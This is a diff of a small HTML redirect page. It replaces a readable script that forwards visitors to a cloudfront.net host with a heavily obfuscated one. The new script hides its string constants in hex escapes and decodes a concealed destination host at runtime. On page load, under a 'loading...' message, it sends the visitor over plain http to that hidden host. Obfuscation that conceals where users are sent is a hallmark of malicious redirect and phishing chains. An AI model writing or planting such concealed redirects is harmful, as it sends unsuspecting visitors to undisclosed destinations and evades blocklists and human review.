@@ -7,36 +7,9 @@
 <meta http-equiv="Expires" content="0" />
 </head>
 <body>
+loading...
 <script type="text/javascript">
-var site='d2203tpxdpggo3.cloudfront.net',
-d = function($str){
-	if(!$str) return '';
-	$tbl='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-';
-	$ky=$tbl.indexOf($str.charAt(0));
-	if($ky===false) return false;
-	$ret='';
-	$cd=0;
-	$bt=0;
-	for($i=1; $i<$str.length; $i++){
-		$x=$tbl.indexOf($str.charAt($i));
-		if($x===false) return false;
-		$cd+=($x<<$bt);
-		$bt+=6;
-		if($bt>8){
-			$b=$cd&0xFF;
-			$bt-=8;
-			$cd>>=8;
-			$b^=(($ky++)%0x3F);
-			$ret=String.fromCharCode($b)+$ret;
-		}
-	}
-	if($bt>0 && $cd) $ret=String.fromCharCode($cd^($ky%0x3F))+$ret;
-	return $ret;
-},
-re = /(^|\?)id=([\w\-]+)/,
-s = window.location.search,
-m = s.match(re);
-window.location.href = 'https://'+site+'/'+m[2]+'?'+Math.floor(Math.random()*9999);
+var __Ox68910=["","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-","\x63\x68\x61\x72\x41\x74","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","XfBRkggTrJ5Doxd7qAF69UcCqFZ7tF9SpDk29BM74","\x73\x65\x61\x72\x63\x68","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x6D\x61\x74\x63\x68","\x68\x72\x65\x66","\x68\x74\x74\x70\x3A\x2F\x2F","\x2F","\x3F","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72"];var d=function(_0x53ccx6){if(!_0x53ccx6){return __Ox68910[0x0]};var _0x53ccx7=__Ox68910[0x1];var _0x53ccx8=_0x53ccx7[__Ox68910[0x3]](_0x53ccx6[__Ox68910[0x2]](0)),_0x53ccx9=__Ox68910[0x0],_0x53ccxa=0,_0x53ccxb=0,_0x53ccxc=_0x53ccx6[__Ox68910[0x4]]-2,_0x53ccxd=_0x53ccx7[__Ox68910[0x3]](_0x53ccx6[__Ox68910[0x5]](-1,1));if(_0x53ccx8===-1){return false};for(var _0x53ccxe=1;_0x53ccxe<=_0x53ccxc;_0x53ccxe++){x=_0x53ccx7[__Ox68910[0x3]](_0x53ccx6[__Ox68910[0x2]](_0x53ccxe));if(x===-1){return false};_0x53ccxa+=(x<<_0x53ccxb);_0x53ccxb+=(_0x53ccxe==_0x53ccxc?_0x53ccxd:6);if(_0x53ccxb>8){b=_0x53ccxa&0xFF;_0x53ccxb-=8;_0x53ccxa>>=8;b^=(_0x53ccx8++%0x3F);_0x53ccx9=String[__Ox68910[0x6]](b)+_0x53ccx9}};if(_0x53ccxb>0){_0x53ccx9=String[__Ox68910[0x6]](_0x53ccxa^(_0x53ccx8++%0x3F))+_0x53ccx9};return _0x53ccx9},site=__Ox68910[0x7],re=/(^|\?)id=([\w\-]+)/,s=window[__Ox68910[0x9]][__Ox68910[0x8]],m=s[__Ox68910[0xa]](re);window[__Ox68910[0x9]][__Ox68910[0xb]]=__Ox68910[0xc]+d(site)+__Ox68910[0xd]+m[0x2]+__Ox68910[0xe]+Math[__Ox68910[0x10]](Math[__Ox68910[0xf]]()*9999);
 </script>
 </body>
 </html>
